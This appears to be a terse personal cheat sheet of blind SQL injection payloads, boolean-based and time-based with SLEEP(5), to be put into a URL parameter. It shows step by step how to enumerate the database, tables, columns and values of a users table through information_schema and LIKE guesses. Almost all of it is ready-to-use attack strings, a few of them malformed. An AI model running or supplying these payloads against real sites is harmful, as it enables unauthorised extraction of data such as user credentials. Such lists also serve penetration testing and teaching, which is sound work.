## Blind SQLI (Boolean)##

Change param in url. 

PARAM VALUE' union select 1,2,3;--

PARAM VALUE' union select 1,2,3 where database() like '%';-- (Will help get DB)

PARAM VALUE' union select 1,2,3 from information_schema.tables where table_schema = 'DB NAME' and table_name like 'a%';-- (Will help get tables)

PARAM VALUE' union select 1,2,3 from information_schema.columns where table_schema ='DB NAME' and table_name='TABLE NAME' and column_name like 'a%'; (Will help get columns)

PARAM VALUE' union select 1,2,3 from users where username like 'a% Will help get values from table and columns)

## Blind SQLI (Time)##

Change param in url.

###TEST for SQLI Time Based###

PARAM VALUE' union select SLEEP(5),2;--

PARAM VALUE' union select SLEEP(5),2 where database() like '%';-- (Will help get DB)

PARAM VALUE' union select SLEEP(5),2 from information_schema.tables where table_schema = 'DB NAME' and table_name like 'a%';-- (Will help get tables)

PARAM VALUE' union select SLEEP(5),2 from information_schema.columns where table_schema ='DB NAME' and table_name='TABLE NAME' and column_name like 'a%'; (Will help get columns)

PARAM VALUE' union select SLEEP(5),2 from users where username like 'a% Will help get values from table and columns)
